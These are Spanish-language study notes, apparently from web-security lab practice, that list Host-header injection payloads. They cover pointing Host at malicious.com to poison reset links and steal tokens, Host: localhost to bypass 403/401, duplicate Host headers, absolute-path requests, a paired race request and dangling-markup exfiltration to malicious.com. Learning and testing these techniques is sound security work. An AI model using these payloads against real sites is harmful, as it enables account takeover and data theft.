-- -
### **1. Modificar cabecera Host agregando un dominio malicioso**
- El objetivo es que el host que ingresado sea el cual se inyecte en el link que se envia a la victima para intentar secustrar sus token.
```http
Host: malicious.com
```

### **2. Modificar cabecera Host con valor localhost o collaborator**
- El objetivo es que el servidor crea que la solicitud proviene del propio localhost con el fin de bypassear **403** y **401**
```http
Host: localhost
Host: collaborator.com
```

### **3. Agregar 2da cabecera host con dominio malicioso**
- El objetivo es que el servidor se confunda y termine reflejando en la request el malicious.com.
```http
Host: site.com
Host: malicious.com
```

### **4. Agregar ruta absoluta en el path de la request**
- El objetivo es que el servidor se confunda y termine reflejando en la request el malicious.com.
```http
GET https://site.con/ HTTP/2
Host: localhost
```

### **5. Enviar 2 solicitudes a la misma vez siendo una valida y otra maliciosa (single state attack)**
**Request1:**
```http
GET / HTTP/1.1
Host: site.com
```

**Request2:**
```http
GET / HTTP/1.1
Host: malicious.com
```
![[Pasted image 20251001183650.png]]

### **5. Via Dangling Markup**
- Consiste en modificar la cabecera host ya que en base a esta se construye una url la cual se incrusta en un documento html y al ser alterada se puede exifltrar datos y explotar XSS.
```http
POST /forgot-password HTTP/2
Host: 0adc00ea04bc641b806a3aab006b00ed.web-security-academy.net:'<a href="https://malicious.com/?

```

--- -
### **Aclaracion**
- Probar cambiar a HTTP1.1 si es que por default esta en HTTP2.012